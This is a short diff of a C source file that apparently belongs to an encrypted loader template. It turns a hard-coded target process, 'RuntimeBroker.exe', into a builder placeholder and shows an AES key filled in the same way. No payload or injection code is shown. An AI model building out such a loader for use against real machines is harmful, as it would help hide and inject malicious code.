@@ -5,7 +5,7 @@
 #include "functions.h"
 #include "AES_128_CBC.h"
 
-#define TARGET_PROCESS "RuntimeBroker.exe"
+#define TARGET_PROCESS "#-TARGET_PROCESS-#"
 
 
 uint8_t aes_k[16] = { #-KEY_VALUE-# };
